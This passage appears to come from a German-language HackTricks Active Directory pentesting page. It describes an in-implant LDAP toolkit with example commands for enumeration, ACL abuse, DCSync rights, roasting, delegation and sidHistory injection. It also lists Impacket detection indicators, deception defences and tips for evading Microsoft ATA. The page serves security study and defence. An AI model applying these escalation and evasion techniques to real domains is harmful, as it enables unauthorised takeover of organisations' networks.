Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen anschließend über den Beacon `ldap <subcommand>` auf. Der gesamte Datenverkehr nutzt den aktuellen Logon-Sicherheitskontext über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischer Zertifikatsvalidierung, sodass weder Socks-Proxies noch Artefakte auf der Festplatte erforderlich sind.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurznamen bzw. OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute (einschließlich Security Descriptors) sowie die Forest-/Domain-Metadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegationseinstellungen und vorhandene Descriptors für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Berechtigungen (GenericAll/WriteDACL/WriteOwner/Attributschreibzugriffe) und Vererbung aufzulisten, wodurch unmittelbare Ziele für die ACL-Privilege-Escalation sichtbar werden.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation und Persistenz

- Object-Creation-BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Computerkonten überall dort vorzubereiten, wo OU-Berechtigungen vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen Ziele direkt, sobald Schreibrechte für Eigenschaften gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner für beliebige AD-Objekte in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die Gegenstücke `remove-*` bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoast-fähig; `add-asreproastable` (UAC-Schalter) markiert ihn für AS-REP roasting, ohne das Passwort anzufassen.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ändern `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus. Dadurch werden Angriffswege für constrained/unconstrained/RBCD ermöglicht und die Notwendigkeit für Remote-PowerShell oder RSAT entfällt.

### sidHistory injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht dadurch eine unauffällige Zugriffsvererbung vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. Dadurch kann ein Angreifer Assets in OUs verschieben, in denen bereits delegierte Rechte vorhanden sind, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Präzise eingegrenzte Entfernungsbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen einen schnellen Rollback, nachdem der Operator Credentials oder Persistenz erlangt hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Abwehrmaßnahmen

[**Erfahre hier mehr darüber, wie Credentials geschützt werden.**](../stealing-credentials/credentials-protections.md)

### **Abwehrmaßnahmen zum Schutz von Credentials**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins nur die Anmeldung an Domain Controllern zu erlauben und ihre Verwendung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Abwehr von LDAP relay**: Event-IDs 2889/3074/3075 überwachen und anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients erzwingen, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Erkennung von Impacket-Aktivitäten

Wenn du gängige AD-Taktiken erkennen möchtest, **verlasse dich nicht ausschließlich auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Servicenamen, temporäre Batch-Dateien oder Ausgabepfade. Erstelle eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC und WMI verwenden. Suche anschließend nach **Implementierungsbesonderheiten**, die auch dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Aussagekraft als Einzelindikatoren** (nach Validierung anhand der eigenen Baseline):
- Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- Mit `0xff` gefülltes Padding bei der DCE/RPC-Authentifizierung
- LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt in SPNEGO `mechToken` platzieren
- SMB2/3-Negotiate-Requests mit wie ASCII aussehenden `ClientGuid`-Werten
- WMI-`IWbemLevel1Login::NTLMLogin` mit dem nicht standardmäßigen Namespace `//./root/cimv2`
- Hardcodierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
- Sparse oder duplizierte Kerberos-Etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine von nativem Windows abweichende Etype-Reihenfolge bei TGS-REQ
- NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit Null-Hostnamen
- Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC-Verification-Trailer oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
- Mehrere dieser Merkmale vom selben Host/Benutzer bzw. aus derselben Session/Zeitspanne sind deutlich aussagekräftiger als jedes einzelne schwache Feld
- **Als Anreicherung verwenden, nicht als eigenständige Alerts**:
- Standarddateinamen, Ausgabepfade, zufällige Servicenamen, temporäre Batch-Namen, Standardnamen für Computerkonten sowie tool-spezifische HTTP-/WebDAV-/RDP-/MSSQL-Strings
- Diese lassen sich von Operatoren leicht ändern und sollten am besten dazu verwendet werden zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Operative Hinweise**:
- Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Transparenz auf der Serviceseite
- Vor der Umwandlung in Alerts muss eine Validierung anhand von Samba-/Linux-Clients, Appliances und älterer Software erfolgen
- Erkennungen sollten mit zunehmendem Vertrauen in die Baseline schrittweise von Anreicherung -> Hunting -> Alerting weiterentwickelt werden

### **Implementierung von Deception-Techniken**

- Die Implementierung von Deception umfasst das Aufstellen von Fallen, etwa durch Decoy-Benutzer oder -Computer mit Eigenschaften wie nicht ablaufenden Passwörtern oder der Markierung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit bestimmten Rechten oder deren Aufnahme in Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zur Bereitstellung von Deception-Techniken findest du unter [Deploy-Deception auf GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Deception**

- **Bei Benutzerobjekten**: Verdächtige Indikatoren sind eine untypische ObjectSID, seltene Anmeldungen, ungewöhnliche Erstellungsdaten und eine geringe Anzahl fehlgeschlagener Passwörter.
- **Allgemeine Indikatoren**: Der Vergleich der Attribute potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können dabei helfen, solche Täuschungen zu erkennen.

### **Umgehung von Detection-Systemen**

- **Umgehung der Microsoft-ATA-Erkennung**:
- **Benutzeraufzählung**: Sitzungsaufzählungen auf Domain Controllern vermeiden, um eine ATA-Erkennung zu verhindern.
- **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticketerstellung hilft, die Erkennung zu umgehen, da kein Downgrade auf NTLM erfolgt.
- **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um die ATA-Erkennung zu vermeiden, da eine direkte Ausführung von einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts für Deception in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit für die Ausnutzung von Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wordlist einsetzen](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Piraten](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket analysieren](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Accounts über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Verwalten der Änderungen an sicheren Netlogon-Kanalverbindungen im Zusammenhang mit CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise in vergessene Null-Session- und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 4) – Forschung zur Umgehung des SID-Filters](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 5) – Golden-GMSA-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 6) – Schema-Change-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Admins einer Child-Domain zu Enterprise Admins eskalieren durch den Missbrauch von AD CS – eine Fortsetzung](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: Entwurf von Active-Directory-DACL-Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
